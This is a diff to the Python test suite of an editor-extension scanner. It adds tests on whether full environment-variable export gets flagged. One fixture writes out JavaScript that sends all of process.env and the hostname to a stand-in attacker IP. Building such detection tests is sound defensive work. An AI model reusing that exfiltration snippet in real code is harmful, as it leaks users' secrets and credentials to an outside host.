@@ -1097,7 +1097,7 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(bundle["metadata"]["schema_version"], "2.3")
         self.assertEqual(bundle["metadata"]["profile"], "smart")
         self.assertEqual(bundle["metadata"]["source"], "fixtures")
-        self.assertEqual(bundle["metadata"]["policy_version"], "3.1.0-calibration.6")
+        self.assertEqual(bundle["metadata"]["policy_version"], "3.1.0-calibration.7")
         self.assertEqual(bundle["metadata"]["scanner_build"], report["scanner_build"])
         self.assertEqual(bundle["metadata"]["ruleset_version"], report["ruleset_version"])
         self.assertEqual(bundle["summary"]["summary"]["total_extensions"], len(discover_from_path(Path("fixtures"))))
@@ -1307,6 +1307,71 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(scanned["severity"], "INFO")
         self.assertIn("process-execution", rule_ids)
         self.assertIn("dynamic-shell-execution", rule_ids)
+
+    def test_whole_environment_sent_to_network_is_reviewed(self) -> None:
+        """Published environment-exfiltration behavior must not look clean."""
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"env-exporter","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const https = require('https');\n"
+                "const snapshot = JSON.stringify({ env: process.env, host: require('os').hostname() });\n"
+                "const request = https.request('http://198.51.100.7:1224/api/checkStatus?sysInfo=' + encodeURIComponent(snapshot));\n"
+                "request.end();\n",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("environment-data-exfiltration", rule_ids)
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.decision, "review")
+        self.assertEqual(report.malware_score, 0)
+
+    def test_selected_environment_telemetry_stays_clean(self) -> None:
+        """Selected, documented telemetry is not equivalent to full env export."""
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"telemetry","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const https = require('https');\n"
+                "const telemetry = JSON.stringify({ version: '1.0', platform: process.platform, arch: process.arch });\n"
+                "https.request('https://telemetry.example/events', { method: 'POST', body: telemetry }).end();\n",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertNotIn("environment-data-exfiltration", rule_ids)
+        self.assertEqual(report.verdict, "clean")
+        self.assertEqual(report.decision, "allow")
+
+    def test_environment_read_without_network_is_not_exfiltration(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"env-local","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const environment = JSON.stringify(process.env);\n"
+                "module.exports = { environmentLength: environment.length };\n",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertNotIn("environment-data-exfiltration", rule_ids)
+        self.assertEqual(report.verdict, "clean")
 
     def test_cross_extension_credential_exposure_findings(self) -> None:
         with TemporaryDirectory() as tmp:
